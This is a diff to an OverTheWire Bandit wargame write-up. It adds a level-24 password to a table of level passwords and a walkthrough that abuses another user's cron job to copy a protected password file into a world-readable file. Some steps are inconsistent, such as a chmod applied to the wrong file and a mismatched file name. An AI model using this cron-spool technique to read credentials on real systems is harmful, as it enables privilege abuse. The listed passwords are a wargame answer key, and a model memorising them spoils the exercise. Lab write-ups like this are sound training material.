@@ -26,6 +26,7 @@
 | Level 20 -> level 21 | bandit21 | bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY |
 | Level 21 -> level 22 | bandit22 | RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz |
 | Level 22 -> level 23 | bandit23 | gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw |
+| Level 23 -> level 24 | bandit24 | hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv |
 
 # Level 1 -> level 2
 
@@ -79,5 +80,49 @@ echo -n "<PASSWORD>" | nc -lp 1234 &</code>
 # Level 22 -> Level 24
 
 ## Problem
+Create a script and run it using a weakness in a cron set up by another user
 
 ## Solution
+1. Inspect the user cron script
+   ```bash
+   ls -lha /etc/cron.d/
+   ```
+2. Read and analyze the content in <code>/etc/cron.d/cronjob_bandit24</code>
+   ```bash
+   cat /etc/cron.d/cronjob_bandit24
+   ```
+3. Check the rights for <code>/var/spool/bandit24</code>
+   ```bash
+   ls -la /var/spool/bandit24  
+   ```
+4. Create a temporary work directory
+   ```bash
+   mktemp -d
+   ```
+5. Create a script `/tmp/tmp.xxxxxxxxxx/script.sh` to write the content of <code>/etc/bandit_pass/bandit24</code> in a readable file
+   ```bash
+   #!/bin/bash
+
+   cat /etc/bandit_pass/bandit24 > /tmp/tmp.xxxxxxxxxx/password
+   ```
+6. Make the script executable for bandit24
+   ```bash
+   chmod 777 /tmp/tmp.xxxxxxxxxx/password
+   ```
+7. Create `/tmp/tmp.xxxxxxxxxx/password` file and make it writable by all accounts
+   ```bash
+   touch /tmp/tmp.xxxxxxxxxx/password
+   chmod 666 /tmp/tmp.xxxxxxxxxx/password
+   ```
+8. Copy the script in <code>/var/spool/bandit24/foo</code>
+   ```bash
+   cp -v /tmp/tmp.xxxxxxxxxx/script.sh /var/spool/bandit24/food
+   ```
+9. Make the temporary directory fully accessible to all accounts
+   ```bash
+   chmod 777 /tmp/tmp.xxxxxxxxxx
+   ```
+10. Survey the content of the destination file while the cron job is run
+    ```bash
+    tail -f /tmp/tmp.xxxxxxxxxx/password
+    ```
